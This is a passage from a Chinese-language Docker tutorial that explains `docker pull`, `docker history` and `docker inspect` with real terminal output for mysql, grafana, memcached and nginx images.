title="注意点"></a>注意点</h4><p>1、pull命令中的NAME，取决于<a href="https://hub.docker.com/%E4%B8%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%90%8D%E3%80%82">https://hub.docker.com/中显示的软件名。</a></p><p>例如：</p><p>下载 mysql 8.3.0 版本，使用 docker pull mysql:8.3.0</p><p>下载 grafana&#x2F;grafana 10.2.4 版本，使用 docker pull grafana&#x2F;grafana:10.2.4 </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:6.3.3</span><br><span class="hljs-number">6.3</span><span class="hljs-number">.3</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br>[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:8.2.6</span><br><span class="hljs-number">8.2</span><span class="hljs-number">.6</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br><br>[root@localhost grafana]<span class="hljs-comment"># docker images | grep grafana</span><br>grafana/grafana                                                   <span class="hljs-number">8.2</span><span class="hljs-number">.6</span>     aeeaa96eea83   <span class="hljs-number">5</span> months ago   <span class="hljs-number">253</span>MB<br>grafana/grafana                                                   <span class="hljs-number">6.3</span><span class="hljs-number">.3</span>     a6e14b4109af   <span class="hljs-number">2</span> years ago    <span class="hljs-number">253</span>MB<br></code></pre></td></tr></table></figure><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>从 docker hub 下载最新版memcached</p><p>docker pull memcached</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">(base) root@localhost:~<span class="hljs-comment"># docker pull memcached:latest</span><br><span class="hljs-section">latest: Pulling from library/memcached</span><br><span class="hljs-section">c229119241af: Pull complete </span><br><span class="hljs-section">af2f0309d301: Pull complete </span><br><span class="hljs-section">35783664a727: Pull complete </span><br><span class="hljs-section">a0d63d088cef: Pull complete </span><br><span class="hljs-section">d2f1f521665d: Pull complete </span><br><span class="hljs-section">24f6b2ace768: Pull complete </span><br><span class="hljs-section">Digest: sha256:c42541495ec1a6925cb105635bcafeedf60a56e3b9e4ac8b1afaf6d7851d70b2</span><br><span class="hljs-section">Status: Downloaded newer image for memcached:latest</span><br><span class="hljs-section">docker.io/library/memcached:latest</span><br></code></pre></td></tr></table></figure><h2 id="查看镜像历史"><a href="#查看镜像历史" class="headerlink" title="查看镜像历史"></a>查看镜像历史</h2><h3 id="docker-history"><a href="#docker-history" class="headerlink" title="docker history"></a>docker history</h3><p><strong>docker history [OPTIONS] images</strong></p><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的历史提交记录信息</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql               <br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB   <br></code></pre></td></tr></table></figure><h4 id="OPTIONS-2"><a href="#OPTIONS-2" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h5><p>以可读的方式展示时间镜像信息和时间，默认开启</p><h5 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h5><p>仅列出提交记录ID</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/tmp</span> docker history <span class="hljs-operator">-</span>q mysql<br>de7c37d1d5ac<br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br></code></pre></td></tr></table></figure><h5 id="–no-trunc-1"><a href="#–no-trunc-1" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整信息</p><h4 id="images"><a href="#images" class="headerlink" title="images"></a>images</h4><p>image ID 或REPOSITORY:TAG</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker images<br>REPOSITORY                TAG          IMAGE ID       CREATED         SIZE<br>grafana/grafana           10.2.4       147eb932c0fd  <span class="hljs-number"> 10 </span>days ago     391MB<br>mysql                     8.3.0        e68e2614955c  <span class="hljs-number"> 5 </span>weeks ago     638MB<br>apache/activemq-artemis   latest       76998b3399b7  <span class="hljs-number"> 3 </span>months ago    312MB<br>lamp_web                  latest       41d9dabcb737  <span class="hljs-number"> 6 </span>months ago    524MB<br>mysql                     latest       de7c37d1d5ac  <span class="hljs-number"> 6 </span>months ago    599MB<br>ubuntu                    latest       4c2c87c6c36e  <span class="hljs-number"> 14 </span>months ago   69.2MB<br>kalilinux/kali-rolling    latest       0d323592c7f5  <span class="hljs-number"> 14 </span>months ago   140MB<br>centos                   <span class="hljs-number"> 7 </span>           c9a1fdca3387  <span class="hljs-number"> 2 </span>years ago     301MB<br>nginx                     latest       eeb9db34b331  <span class="hljs-number"> 2 </span>years ago     134MB<br>php                       7.4.21-fpm   1829ff0bdd88  <span class="hljs-number"> 2 </span>years ago     364MB<br>vulhub/flink              1.11.2       b137254280cc  <span class="hljs-number"> 3 </span>years ago     625MB<br>islandora/activemq        latest       5d0bce1752d7  <span class="hljs-number"> 3 </span>years ago     272MB<br>webcenter/activemq        latest       3af156432993  <span class="hljs-number"> 7 </span>years ago     422MB<br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql<br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB     <br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/tmp</span> docker history mysql:<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><br>IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT<br>e68e2614955c   <span class="hljs-number">5</span> weeks ago   CMD [<span class="hljs-string">&quot;mysqld&quot;</span>]                                  <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   EXPOSE <span class="hljs-built_in">map</span>[<span class="hljs-number">3306</span><span class="hljs-operator">/</span>tcp:&#123;&#125; <span class="hljs-number">33060</span><span class="hljs-operator">/</span>tcp:&#123;&#125;]            <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENTRYPOINT [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   COPY docker-entrypoint.sh <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>local<span class="hljs-operator">/</span>bin<span class="hljs-symbol">/</span> <span class="hljs-comment"># …   13.5kB    buildkit.dockerfile.v0</span><br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   VOLUME [<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>mysql]                         <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  microdnf install <span class="hljs-operator">-</span>…   <span class="hljs-number">303</span>MB     buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV MYSQL_SHELL_VERSION<span class="hljs-operator">=</span><span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>.el8             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eu;  &#123;   echo &#x27;[mysql-to…   <span class="hljs-number">226</span>B      buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  microdnf install <span class="hljs-operator">-</span>…   <span class="hljs-number">197</span>MB     buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eu;  &#123;   echo &#x27;[mysqlinn…   <span class="hljs-number">246</span>B      buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV MYSQL_VERSION<span class="hljs-operator">=</span><span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>.el8                   <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV MYSQL_MAJOR<span class="hljs-operator">=</span>innovation                      <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  <span class="hljs-attr">key</span><span class="hljs-operator">=</span>&#x27;BCA4 <span class="hljs-number">3417</span> C3B…   <span class="hljs-number">3.17</span>kB    buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  microdnf install <span class="hljs-operator">-</span>…   <span class="hljs-number">14</span>MB      buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  <span class="hljs-attr">arch</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$(uname -m)&quot;</span>…   <span class="hljs-number">2.4</span>MB     buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV GOSU_VERSION<span class="hljs-operator">=</span><span class="hljs-number">1.16</span>                           <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  groupadd <span class="hljs-operator">-</span>-system …   <span class="hljs-number">2.77</span>kB    buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c <span class="hljs-comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c <span class="hljs-comment">#(nop) ADD file:53c58659a3a149d31…   122MB   </span><br></code></pre></td></tr></table></figure><h2 id="查看镜像元数据"><a href="#查看镜像元数据" class="headerlink" title="查看镜像元数据"></a>查看镜像元数据</h2><h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的基础数据</p><h4 id="OPTIONS-3"><a href="#OPTIONS-3" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  /tmp docker images <span class="hljs-string">| grep nginx</span><br>nginx                     latest       eeb9db34b331   <span class="hljs-number">2</span> years ago     <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/tmp</span> docker inspect nginx<br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;sha256:eeb9db34b33190cac170b27d857e9b23511d396a2609c1a54e93025634afed0a&quot;</span>,<br>        <span class="hljs-string">&quot;RepoTags&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx:latest&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;RepoDigests&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;Parent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Comment&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2021-12-29T18:45:32.26799474Z&quot;</span>,<br>        <span class="hljs-string">&quot;Container&quot;</span>: <span class="hljs-string">&quot;28117e6cd07462919e64874c17cec15a453e5b3d99b088f04a12a7640c27c280&quot;</span>,<br>        <span class="hljs-string">&quot;ContainerConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;28117e6cd074&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;#(nop) &quot;</span>,<br>                <span class="hljs-string">&quot;CMD [<span class="hljs-char escape_">\&quot;</span>nginx<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>-g<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>daemon off;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;DockerVersion&quot;</span>: <span class="hljs-string">&quot;20.10.7&quot;</span>,<br>        <span class="hljs-string">&quot;Author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span 